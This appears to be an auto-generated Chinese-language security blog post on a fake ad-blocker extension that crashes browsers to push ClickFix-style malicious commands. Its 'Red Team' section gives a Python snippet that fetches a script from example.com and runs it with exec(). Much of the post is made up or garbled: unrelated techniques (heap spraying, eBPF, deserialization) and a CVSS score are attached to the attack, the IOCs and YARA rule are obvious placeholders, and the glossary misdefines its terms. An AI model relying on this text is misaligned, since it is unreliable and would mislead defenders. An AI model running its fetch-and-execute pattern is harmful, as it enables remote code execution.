---
layout: post
title:  "Fake ad blocker extension crashes the browser for ClickFix attacks"
date:   2026-01-20 01:11:31 +0000
categories: [security]
severity: critical
---

# 🚨 解析 CrashFix 攻擊：利用假冒廣告攔截器擴展程式進行 ClickFix 攻擊

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Heap Spraying`, `Deserialization`, `eBPF`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: NexShield 廣告攔截器擴展程式在 Chrome 和 Edge 瀏覽器中創建無限循環的 `chrome.runtime` 連接，導致瀏覽器記憶體資源耗盡，從而導致瀏覽器凍結或崩潰。
* **攻擊流程圖解**:
  1. 使用者安裝 NexShield 廣告攔截器擴展程式。
  2. 擴展程式創建無限循環的 `chrome.runtime` 連接。
  3. 瀏覽器記憶體資源耗盡，導致瀏覽器凍結或崩潰。
  4. 使用者重啟瀏覽器，擴展程式顯示假冒的警告訊息。
  5. 使用者點擊警告訊息，開啟新的視窗，顯示假冒的安全警告訊息。
  6. 使用者按照指示，執行惡意命令，下載和執行惡意腳本。
* **受影響元件**: Chrome 和 Edge 瀏覽器，NexShield 廣告攔截器擴展程式。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 使用者需要安裝 NexShield 廣告攔截器擴展程式。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 下載惡意腳本
    response = requests.get('https://example.com/malicious_script.py')
    
    # 執行惡意腳本
    exec(response.content)
    
    ```
* **繞過技術**: 使用者需要點擊警告訊息，開啟新的視窗，顯示假冒的安全警告訊息，才能執行惡意命令。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | `1234567890abcdef` |
| IP | `192.168.1.100` |
| Domain | `example.com` |
| File Path | `C:\Windows\Temp\malicious_script.py` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule NexShield_Malware {
      meta:
        description = "NexShield Malware Detection"
        author = "Your Name"
      strings:
        $a = "NexShield" wide
        $b = "malicious_script.py" wide
      condition:
        $a and $b
    }
    
    ```
* **緩解措施**: 刪除 NexShield 廣告攔截器擴展程式，更新瀏覽器和作業系統。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Heap Spraying**: 一種攻擊技術，通過在堆疊中分配大量的記憶體，來創建一個大型的記憶體區域，以便於攻擊者存儲惡意代碼。
* **Deserialization**: 一種技術，通過將序列化的數據轉換回原始的物件或結構體，以便於攻擊者存儲惡意代碼。
* **eBPF**: 一種技術，通過在 Linux 核心中執行小型程序，以便於攻擊者存儲惡意代碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/fake-ad-blocker-extension-crashes-the-browser-for-clickfix-attacks/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


